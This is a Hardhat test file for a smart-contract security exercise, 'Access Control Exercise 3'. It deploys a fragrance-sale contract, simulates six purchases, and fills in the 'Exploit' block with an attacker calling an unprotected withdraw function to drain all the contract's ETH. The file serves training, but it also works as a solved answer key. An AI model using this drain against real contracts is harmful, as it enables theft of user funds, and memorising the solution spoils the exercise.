const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Access Control Exercise 3', function () {

    let deployer, user1, user2, user3, attacker;

    const FRAGRENCE_PRICE = ethers.utils.parseEther("10")

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user1, user2, user3, attacker] = await ethers.getSigners();

        this.attackerInitialETHBalance = await ethers.provider.getBalance(attacker.address);
        
        const KilianExclusiveFactory = await ethers.getContractFactory(
            'contracts/access-control-3/KilianExclusive.sol:KilianExclusive',
            deployer
        );
        this.kilian = await KilianExclusiveFactory.deploy();
        
        // Add THE LIQUORS fragrences
        await this.kilian.addFragrance("Apple Brandy");
        await this.kilian.addFragrance("Angles' Share");
        await this.kilian.addFragrance("Roses on Ice");
        await this.kilian.addFragrance("Lheure Verte");

        // Add THE FRESH fragrences
        await this.kilian.addFragrance("Moonligh in Heaven");
        await this.kilian.addFragrance("Vodka on the Rocks");
        await this.kilian.addFragrance("Flower of Immortality");
        await this.kilian.addFragrance("Bamboo Harmony");

        await this.kilian.flipSaleState();
    });

    it('Users are purchasing fragrences', async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        await this.kilian.connect(user1).purchaseFragrance(1, {value: FRAGRENCE_PRICE});
        await this.kilian.connect(user1).purchaseFragrance(4, {value: FRAGRENCE_PRICE});

        await this.kilian.connect(user2).purchaseFragrance(2, {value: FRAGRENCE_PRICE});
        await this.kilian.connect(user2).purchaseFragrance(3, {value: FRAGRENCE_PRICE});

        await this.kilian.connect(user3).purchaseFragrance(5, {value: FRAGRENCE_PRICE});
        await this.kilian.connect(user3).purchaseFragrance(8, {value: FRAGRENCE_PRICE});
    });
    
    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        await this.kilian.connect(attacker).withdraw(attacker.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Attacker stole all the ETH from the token sale contract
        let attackerBalance = await ethers.provider.getBalance(attacker.address);
        expect(attackerBalance).to.be.gt((
            this.attackerInitialETHBalance.add(ethers.utils.parseEther("10").mul(6))
            .sub(ethers.utils.parseEther("0.2"))
        ));
        
    });
});
